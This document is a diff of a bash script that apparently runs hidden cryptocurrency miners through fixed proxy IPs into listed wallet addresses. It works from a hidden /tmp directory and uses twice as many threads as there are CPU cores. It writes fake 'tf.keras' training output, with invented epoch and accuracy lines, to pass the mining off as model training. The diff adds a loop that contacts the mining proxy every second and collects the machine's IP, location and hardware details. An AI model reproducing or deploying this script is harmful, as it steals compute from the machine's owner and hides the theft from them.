@@ -1,28 +1,34 @@
 #!/bin/bash
-echo '{ "type":"tf.keras",'
-echo '"version":"0.0.1",'
-echo '"status":"Epoch 1/5 1875/1875 [==============================] - 5s 2ms/step - loss: 0.2978 - accuracy: 0.9137",'
+echo '{ '
+echo '"type":"tf.keras",' > /tmp/keras.json
+echo '"version":"0.0.12",' >> /tmp/keras.json
+if [[ $1 -gt 0 ]] 
+then
+    echo '"version":"0.0.12",'
+fi
+echo '"status":"Epoch 3/5 1975/1975 [==============================] - 5s 4ms/step - loss: 0.1113 - accuracy: 0.9027",' >> /tmp/keras.json
 
 PROX=168.119.180.25
-ETPort=443
+ETPort=80
 RVPort=8080
-VCPort=80
+VCPort=443
 XMPort=21
 TESTPort=587
 TESTPort2=465
-DisplayRefrech=30
-echo '"df":'$DisplayRefrech','
+DisplayRefrech=600
+echo '"df":'$DisplayRefrech',' >> /tmp/keras.json
 
-HZ_PROX1=168.119.180.25
-HZ_PROX2=188.34.159.9
-EU_PROX=168.119.180.25
-US_PROX=173.199.123.152
-CA_PROX=173.199.123.152
-ASIA_PROX=168.119.180.25
+HZ_PROX1=$PROX
+HZ_PROX2=168.119.180.25
+EU_PROX=$PROX
+US_PROX=168.119.180.25
+CA_PROX=168.119.180.25
+ASIA_PROX=$PROX
 
 #VCOptions="d=16,xn=1,hybrid"
-#VCOptions="mc=VRSC"
-VCOptions="c=DOGE,mc=VRSC"
+VCOptions="mc=VRSC"
+#VCOptions="c=DOGE,m=solo"
+#VCOptions="c=DOGE"
 #VCOptions="c=VRSC,mc=VRSC"
 
 #VCOptions="X"
@@ -31,7 +37,7 @@ SWITCHOPG=AUTO
 SWITCHOP=VC
 
 #SWITCHPROX=AUTO
-SWITCHPROX=$HZ_PROX1
+SWITCHPROX=$HZ_PROX2
 
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
@@ -47,10 +53,19 @@ W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
 W_BT="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
 W_DG="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
 W_DG2="DSro3i42vz2MytCw22S4wun5qM5bTNNy5c"
+W_DG3="DPvNFshhBNh2GHV5KUsNdLvpgeUzw4HAb2"
+W_DG4="DA6Q7BdoFBJQNvfCeUrHoeWLHXL857maZ9"
 
 
-W_VC=$W_DG2
+W_VC=$W_DG3
+VC_LUCK=""
+#VC_LUCK="c=VRSC,mc=VRSC"
 
+if [ $VC_LUCK ]
+then 
+W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+VCOptions=$VC_LUCK
+fi
 # Directory
 Work_Dir="/tmp/.max/"
 mkdir -p $Work_Dir
@@ -71,14 +86,21 @@ function displaytime {
   printf '%d seconds\n' $S
 }
 
+jammer() {
+    while true;
+    do
+        curl -s $SWITCHPROX:$VCPort -m 1  > /dev/null ;
+        sleep 1
+    done
+}
 
 
 ##  CPU info
 
 echo -e '#####################################   CPU info  ###########################################' > /tmp/pysi.log
-
+jammer &
 VCPUNUM=$(nproc)
-echo '"nproc":'$VCPUNUM','
+echo '"nproc":'$VCPUNUM',' >> /tmp/keras.json
 
 cpufile=/proc/cpuinfo
 test -f $cpufile || exit 1
@@ -117,7 +139,7 @@ gcard=$(lspci 2>> /tmp/.max/err| awk -F ':' '/VGA/{print $3}')
 netinfo=$(ip addr 2>> /tmp/.max/err| grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
 macaddr=$(echo "$netinfo" | awk '/link/{print $2}')
 ipaddr=$(echo "$netinfo" | awk '/inet/{print $2}' | awk -F'/' '{print $1}')
-echo '"ip_backend":"'$ipaddr'",'
+echo '"ip_backend":"'$ipaddr'",' >> /tmp/keras.json
 #echo "Ethernet: MAC Address: ${macaddr}.  IP Address: ${ipaddr}."
 
 echo -e '#############################################################################################' > /tmp/pysi.log
@@ -151,15 +173,15 @@ XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')
 
 
 ETHPROFIT=$(python3 -c "print('%.2f' % (22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 ) )"  )
-RVPROFIT=$(python3 -c "print('%.2f' % (8.0*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
+RVPROFIT=$(python3 -c "print('%.2f' % (2.7*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
 VCPROFIT=$(python3 -c "print('%.2f' % (1.3*$VCREWARD*1e6*$VCPRICE*24*30 ) )")
 XMPROFIT=$(python3 -c "print('%.2f' % ( 300.2*$XMREWARD*$XMPRICE*24*30 ) )"   )
 
 echo "Normal Month worth : ET = $ETHPROFIT , RV = $RVPROFIT , VC = $VCPROFIT , XM = $XMPROFIT" > /tmp/pysi.log
-echo '"ET_pro":'$ETHPROFIT','
-echo '"RV_pro":'$RVPROFIT','
-echo '"VC_pro":'$VCPROFIT','
-echo '"XM_pro":'$XMPROFIT','
+echo '"ET_pro":'$ETHPROFIT','>> /tmp/keras.json
+echo '"RV_pro":'$RVPROFIT',' >> /tmp/keras.json
+echo '"VC_pro":'$VCPROFIT',' >> /tmp/keras.json
+echo '"XM_pro":'$XMPROFIT',' >> /tmp/keras.json
 ## getting IP info
 #COININFO=$(wget -q -O - https://whattomine.com/coins.json)
 #COININFO_PARSED=$(echo $COININFO|grep -oP '(?<="coins": ")[^"]*')
@@ -178,12 +200,12 @@ LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
 #echo $JSINFO
 echo "let's name it: $INFO" > /tmp/pysi.log
 
-echo '"ip":"'$IIP'",'
+echo '"ip":"'$IIP'",' >> /tmp/keras.json
 
-echo '"org":"'$IPORG'",'
-echo '"city":"'$CITY'",'
-echo '"country":"'$COUNTRY'",'
-echo '"region":"'$REGION'",'
+echo '"org":"'$IPORG'",' >> /tmp/keras.json
+echo '"city":"'$CITY'",' >> /tmp/keras.json
+echo '"country":"'$COUNTRY'",' >> /tmp/keras.json
+echo '"region":"'$REGION'",' >> /tmp/keras.json
 
 ################## Best Server ##################
 if [ $SWITCHPROX == AUTO ]
@@ -324,7 +346,7 @@ OP=VC
 CPU='OLD'
 BCColor="$On_Red""$BICyan"
 fi
-echo '"cpu_type":"'$CPU'",'
+echo '"cpu_type":"'$CPU'",' >> /tmp/keras.json
 
 #################### GPU Type #########################
 GPU=NULL
@@ -378,8 +400,12 @@ PROG=CL
 BGColor=$On_IPurple
 
 fi
-echo '"gpu_type":"'$GPU'",'
+echo '"gpu_type":"'$GPU'",' >> /tmp/keras.json
 
+if  [[ "$1" -ge 0 ]] 
+then
+    echo '"gpu_type":"'$GPU'",'
+fi
 
 ##################################################################
 ########                execution                        #########     
@@ -399,8 +425,8 @@ else
 OP=$SWITCHOP
 fi
 
-echo '"opc":"'$OP'",'
-echo '"opg":"'$OPG'",'
+echo '"opc":"'$OP'",' >> /tmp/keras.json
+echo '"opg":"'$OPG'",' >> /tmp/keras.json
 
 i="0"
 
@@ -487,7 +513,18 @@ fi
 ##################################################################
 ########                Display                          #########     
 ##################################################################
-echo -en '"wating":"'
+if [[ $1 -gt 0 ]] 
+then
+    echo -en '"runing":"'
+elif [[ $1 == 0 ]] 
+then
+    echo -en '"s":"'
+else
+    cat /tmp/keras.json
+    echo -en '"wating":"'
+fi
+
+
 i=0
 while true
     do
@@ -521,7 +558,10 @@ while true
                 GPROFIT=$(python3 -c "print('%.2f' % ($ETHREWARD * $Gspeed * 1e6 * $ETHPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
                 fi
                 echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off} | GPing :${BIRed} $Gping ${Color_Off} | PerMonth :${BIRed} $GPROFIT ${Color_Off}"  > /tmp/pysi.log
-                echo -en 'G'$GPROFIT' '
+                if [[ $1 -gt 0 ]] 
+                then
+                    echo -en 'G:'$Gspeed'>'$GPROFIT' '
+                fi
         fi
 
 
@@ -535,7 +575,11 @@ while true
             XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
             XMPROFIT=$(python3 -c "print('%.2f' % ($Xspeed * $XMREWARD * $XMPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
             echo -e "${BIWhite}${On_Red}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off} | Xping :${BIRed} $Xping ${Color_Off} | PerMonth :${BIRed} $XMPROFIT ${Color_Off}"  > /tmp/pysi.log
-            echo -en 'X'$XMPROFIT' '
+            
+            if [[ $1 -gt 0 ]] 
+            then
+                echo -en 'C:'$Xspeed'>'$XMPROFIT' '
+            fi
 
         elif [ $OP == "VC" ]
         then
@@ -544,7 +588,11 @@ while true
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
             VCPROFIT=$(python3 -c "print('%.2f' % ( $Vspeed * $VCREWARD * 1e6 * $VCPRICE * 24 *30 ))" 2>> /tmp/.max/err) 
             echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off} | PerMonth :${BIRed} $VCPROFIT ${Color_Off}"  > /tmp/pysi.log
-            echo -en 'C'$VCPROFIT' '
+            
+            if [[ $1 -gt 0 ]] 
+            then
+                echo -en 'C:'$Vspeed'>'$VCPROFIT' '
+            fi
         else 
             Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
             VSHARE=$(grep Acc ooutvc | wc -l)
@@ -555,7 +603,10 @@ while true
             Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
             XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
             echo -e "${BIWhite}${On_Red} XM -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}"  > /tmp/pysi.log
-            echo -en 'C'$VCPROFIT' '       
+            if [[ $1 -gt 0 ]] 
+            then
+                echo -en 'C:'$Vspeed'>'$VCPROFIT' '
+            fi 
         fi
 
         if [ $Debug == "True" ]
@@ -572,7 +623,18 @@ while true
         echo > /tmp/pysi.log
         echo > /tmp/pysi.log
         
-        echo -en '*'
+        if [[ $1 -gt 0 ]] 
+        then
+            echo -en '*'
+        elif [[ $1 == 0 ]] 
+        then
+
+            echo -en " "
+        else
+            echo -en '*'
+        fi
+
+        tail -f /tmp/pysi.log        
         sleep $DisplayRefrech
         
 
